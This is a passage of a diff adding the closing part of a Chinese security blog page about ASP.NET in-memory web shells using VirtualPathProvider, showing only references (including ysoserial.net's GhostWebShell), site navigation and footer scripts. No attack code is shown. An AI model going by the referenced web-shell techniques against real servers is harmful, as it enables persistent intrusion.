+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526857545-608a5f59-9f81-4399-bbda-818eea348bc5.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526857545-608a5f59-9f81-4399-bbda-818eea348bc5.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647526857545-608a5f59-9f81-4399-bbda-818eea348bc5.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="参考" class="headerLink">
+    <a href="#%e5%8f%82%e8%80%83" class="header-mark"></a>5 参考</h2><p><a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs" target="_blank" rel="noopener noreferrer">https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/zh-cn/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8</a></p>
+<p><a href="https://www.codeguru.com/dotnet/using-friendly-urls-in-asp-net-web-forms/" target="_blank" rel="noopener noreferrer">https://www.codeguru.com/dotnet/using-friendly-urls-in-asp-net-web-forms/</a></p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-05-04</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" data-title="ASP.NET下的内存马(四) VirtualPath内存马"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" data-title="ASP.NET下的内存马(四) VirtualPath内存马"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" data-title="ASP.NET下的内存马(四) VirtualPath内存马"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" data-title="ASP.NET下的内存马(四) VirtualPath内存马"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" data-title="ASP.NET下的内存马(四) VirtualPath内存马" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;ASP.NET下的内存马(四) VirtualPath内存马&#34;, &#34;https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/asp-net-memory-shell-httplistener/" class="prev" rel="prev" title="ASP.NET下的内存马(三)：HttpListener内存马"><i class="fas fa-angle-left fa-fw"></i>ASP.NET下的内存马(三)：HttpListener内存马</a>
+            <a href="/posts/java-expression-exploit/" class="next" rel="next" title="Java表达式注入的武器化利用">Java表达式注入的武器化利用<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
